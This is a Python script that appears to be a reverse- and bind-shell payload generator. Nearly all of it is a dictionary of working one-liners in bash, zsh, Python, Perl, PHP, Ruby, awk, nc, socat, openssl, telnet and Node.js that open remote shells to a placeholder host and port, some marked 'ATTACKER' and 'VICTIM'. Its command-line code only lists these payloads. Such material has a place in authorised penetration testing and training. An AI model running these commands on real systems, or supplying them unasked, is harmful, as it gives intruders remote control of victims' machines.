#!/bin/env python
import argparse

#Lists
payloads_reverse = ['bash', 'zsh','python', 'socat', 
                    'perl','telnet', 'php', 'ruby', 
                    'awk','nc', 'openssl', 'nodejs']

payloads_bind = ['python', 'ruby', 'socat', 'perl', 'php']


#Base64 Supported payloads
payloads_b64 = ['bash', "python"]


payloads = {
    'reverse' : {
        'bash' : {
            0 : "bash -c 'bash -i >& /dev/tcp/127.0.0.1/9001 0>&1'",
            1 : "bash -c '0<&196;exec 196<>/dev/tcp/127.0.0.1/9001; sh <&196 >&196 2>&196'",
            2 : "bash -c '/bin/bash -l > /dev/tcp/127.0.0.1/9001 0<&1 2>&1'",
            3 : "bash -c 'sh -i >& /dev/udp/127.0.0.1/9001 0>&1'"
        },
        
        'zsh' :{
            0:"zsh -c 'zmodload zsh/net/tcp && ztcp 127.0.0.1 9001 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"
        },

        'python' : {
            0: "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'",
            1: "python3 -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",9001));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'",
            2: "python -c 'socket=__import__(\"socket\");os=__import__(\"os\");pty=__import__(\"pty\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'",
            3: "python -c 'socket=__import__(\"socket\");subprocess=__import__(\"subprocess\");os=__import__(\"os\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            4: "python -c 'a=__import__;s=a(\"socket\");o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect((\"127.0.0.1\",9001));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'",
            5: "python -c 'a=__import__;b=a(\"socket\");p=a(\"subprocess\").call;o=a(\"os\").dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((\"127.0.0.1\",9001));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([\"/bin/sh\",\"-i\"])'",
            6: "python -c 'a=__import__;s=a(\"socket\").socket;o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s();c.connect((\"127.0.0.1\",9001));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'",
            7: "python -c 'a=__import__;b=a(\"socket\").socket;c=a(\"subprocess\").call;s=b();s.connect((\"127.0.0.1\",9001));f=s.fileno;c([\"/bin/sh\",\"-i\"],stdin=f(),stdout=f(),stderr=f())'",
            8: "python -c 'a=__import__;b=a(\"socket\");c=a(\"subprocess\").call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((\"127.0.0.1\",9001));f=s.fileno;c([\"/bin/sh\",\"-i\"],stdin=f(),stdout=f(),stderr=f())'"

        },

       'socat' : {
            0:"ATTACKER: socat file:`tty`,raw,echo=0 TCP-L:9001\nVICTIM: tmp/socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:127.0.0.1:9001"
        },

       'perl' :  {
            0:"perl -e 'use Socket;$i=\"127.0.0.1\";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
            1:"perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"127.0.0.1:9001\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
        },

        'telnet': {
            0: "ATTACKER: Start two listeners, 1st for input, 2nd for output\nVICTIM: telnet 127.0.0.1 9001 | /bin/sh | telnet 127.0.0.1 1024"
        },
        
        'php' :{
            0:"php -r '$sock=fsockopen(\"127.0.0.1\",9001);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            1:"php -r '$sock=fsockopen(\"127.0.0.1\",9001);shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            2:"php -r '$sock=fsockopen(\"127.0.0.1\",9001);`/bin/sh -i <&3 >&3 2>&3`;'",
            3:"php -r '$sock=fsockopen(\"127.0.0.1\",9001);system(\"/bin/sh -i <&3 >&3 2>&3\");'",
            4:"php -r '$sock=fsockopen(\"127.0.0.1\",9001);passthru(\"/bin/sh -i <&3 >&3 2>&3\");'",
            5:"php -r '$sock=fsockopen(\"127.0.0.1\",9001);popen(\"/bin/sh -i <&3 >&3 2>&3\", \"r\");'",
            6:"php -r '$sock=fsockopen(\"127.0.0.1\",9001);$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"
        },

        'ruby' : {
            0:"ruby -rsocket -e'f=TCPSocket.open(\"127.0.0.1\",9001).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            1:"ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"127.0.0.1\",\"9001\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}'"
        },

        'awk' : {
            0:"awk 'BEGIN {s = \"/inet/tcp/0/127.0.0.1/9001\"; while(42) { do{ printf \"$ \" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"
        },
        
        'nc' : {
            0:"rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 9001 >/tmp/f"
        },

        'openssl' : {
            0:"ATTACKER: ncat --ssl -vv -l -p 9001\nVICTIM: mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 127.0.0.1:9001 > /tmp/s; rm /tmp/s"
        },

        'nodejs' : {
            0: "require('child_process').exec('nc -e /bin/sh 127.0.0.1 9001')"
        }
    },

    'bind' : {
        'python' : {
            0:"python -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",9001));s1.listen(1);c,a=s1.accept();\\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")'"        
    
        },

        'php' : {
            0:"php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,\"0.0.0.0\",9001);socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,\"$ \",2))exit;$in=socket_read($cl,100);$cmd=popen(\"$in\",\"r\");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'"
        
        },

        'socat' : {
            0:"VICTIM: socat TCP-LISTEN:9001,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane\nATTACKER: socat FILE:`tty`,raw,echo=0 TCP:127.0.0.1:9001" 
        },
        
        'perl' : {
                0:"perl -e 'use Socket;$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/bash -i\");};'"  
        },

        'ruby' : {
            0:"ruby -rsocket -e 'f=TCPServer.new(9001);s=f.accept;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",s,s,s)'"
        }
        
    }

}



def message():
        print('Specify one of the following options:')
        print('-t all_reverse')
        print('-t all_bind')
        print('-t type_reverse')
        print('-t type_bind')
        print('\nExample: -t python_bind')

def LISTALL(TYPE):
    print(f"[+] Listing ALL {TYPE} payloads...")
    print('PAYLOAD_NAME')
    print('LEVEL : PAYLOAD') 
    payload_struc = payloads[TYPE]
    for key in payload_struc.keys():
        print(key.upper())
        payload_dict = payload_struc[key]
        for i in payload_dict:
            print(f'{i} : {payload_dict[i]}')
            print()

def LIST(TYPE, TYPE_LIST):
        print('PAYLOAD_NAME')
        print('LEVEL : PAYLOAD') 

        payload_dict = payloads[TYPE][TYPE_LIST]
        for i in payload_dict:
            print(f"{i} : {payload_dict[i]}")
            print()
            print()


class List(argparse.Action):
    def __call__(self, parser, namespace, values, option_string):
        print(parser.usage)
        values = values.split('_')
        if values[0] == 'all':
            if values[1] == 'reverse' or values[1] == 'bind':
                LISTALL(values[1]) 
            else:
                message()
        
        elif values[0] in payloads_reverse:
            if values[1] == 'reverse': 
                print(f"[+] Listing {values[0]}"+ '_' + f"{values[1]} payloads...")
                LIST(values[1], values[0])

            elif values[1] == 'bind':
                print(f"[+] Listing {values[0]}"+ '_' + f"{values[1]} payloads...")
                LIST(values[1], values[0])

            else:
                message()

        else:
            message()
        
        parser.exit()

    
